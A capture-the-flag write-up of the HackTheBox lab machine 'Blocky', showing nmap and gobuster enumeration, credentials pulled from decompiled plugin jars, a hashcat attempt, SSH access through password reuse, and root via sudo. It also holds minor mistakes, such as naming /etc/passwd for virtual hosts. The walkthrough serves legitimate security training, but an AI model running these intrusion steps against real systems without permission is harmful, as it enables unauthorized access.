---
title: Bloky HTB (English)
image: /assets/img/Anexos/Pasted%20image%2020250404085424-1.png
description: Bloky HTB Machine [Difuculty easy]
categories: [CTF,HackTheBox]
tags: [web,very easy]
---



## Introduction

Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators.

### Machine Description

![](/assets/img/Anexos/Pasted%20image%2020250404135814-1.png)

- Name: Bloky
- Goal: Get two flags
- Difficulty: easy
- Operating System: Linux
- link: [Bloky](https://app.hackthebox.com/machines/48)


### PDF Link
- PDF: [PDF Link](https://github.com/juanbelin/Writeups-CTFs-Challenges/blob/main/HTB/M%C3%A1quina%20Blocky.pdf)

## Reconnaissance
We start executing a full scan using `nmap` in order to know the ports and services running at the machine:
```shell
nmap -sSCV --min-rate=5000 -Pn -n -p- 10.10.10.37 -oN Nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-04 08:58 CEST
Nmap scan report for 10.10.10.37
Host is up (0.064s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.56 seconds
```

Nmap report me the ports _21_,_22_ ,_80_, _8182_ and _25565_. 

Firtsly I set the virtual hosting in _/etc/passwd_

![](/assets/img/Anexos/Pasted%20image%2020250404090358-1.png)

The machines contains this web:

![](/assets/img/Anexos/Pasted%20image%2020250404090502-1.png)


I start fuzzing using `gobuster`, it's kinda obvious the web is using wordpress:
```shell
gobuster dir -u http://blocky.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blocky.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 289]
/.html                (Status: 403) [Size: 290]
/index.php            (Status: 301) [Size: 0] [--> http://blocky.htb/]
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/wp-login.php         (Status: 200) [Size: 2397]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/license.txt          (Status: 200) [Size: 19935]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/readme.html          (Status: 200) [Size: 7413]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
```

It's using  old version but not exploitable  for now.

![](/assets/img/Anexos/Pasted%20image%2020250404091218-1.png)


2 _jar_ files exists in the plugins direcotory:

![](/assets/img/Anexos/Pasted%20image%2020250404091415-1.png)

I decompile those using this online tool:

![](/assets/img/Anexos/Pasted%20image%2020250404091848-1.png)

In _BlockyCore.java_ I find the mysql credentials. As `gobuster` reported about **phpmyadmin** we can try:  

![](/assets/img/Anexos/Pasted%20image%2020250404091908-1.png)

## Explotation 

![](/assets/img/Anexos/Pasted%20image%2020250404094213-1.png)

We are in. 

I find a user and password.

![](/assets/img/Anexos/Pasted%20image%2020250404094654-1.png)

Let's try to crack it using `hashcat`
```shell
hash-identifier
/usr/bin/hash-identifier:13: SyntaxWarning: invalid escape sequence '\ '
  logo='''   #########################################################################
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/

Possible Hashs:
[+] MD5(Wordpress)
```


```shell
hashcat --example-hashes | grep '$P'
  Example.Hash........: $P$946647711V1klyitUYhtB8Yw5DMA/w.
  Example.Hash........: $PHPS$30353031383437363132$f02b0b2f25e5754edb04522c346ba243
  Example.Hash........: $PEM$1$4$f5662bd8383b4b40$2048$2993b585d3fb2e7b...12b46 [Truncated, use --mach for full length]
  Example.Hash........: $PEM$2$4$ed02960b8a10b1f1$2048$a634c482a95f23bd...fe6bb [Truncated, use --mach for full length]
```

```shell
hashcat --example-hashes | grep '$P$946647711V1klyitUYhtB8Yw5DMA/w.' -C 9
  Category............: Generic KDF
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: $P$946647711V1klyitUYhtB8Yw5DMA/w.
  Example.Pass........: hashcat
  Benchmark.Mask......: ?b?b?b?b?b?b?b
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #500
```

> I realize this is a rabbit hole and I can't crack the password so let's try **ssh** using **notch** user and the **mysql** password

 
```shell
ssh notch@10.10.10.37
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ 
```
## Privilage Escalation 
It worked. Once we're in, the root escalation is very easy since we're in **sudores** :

```shell
sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Just `sudo su` and we'll be root.
```shell
notch@Blocky:~/minecraft/config$ sudo su
root@Blocky:/home/notch/minecraft/config# id  
uid=0(root) gid=0(root) groups=0(root)
```




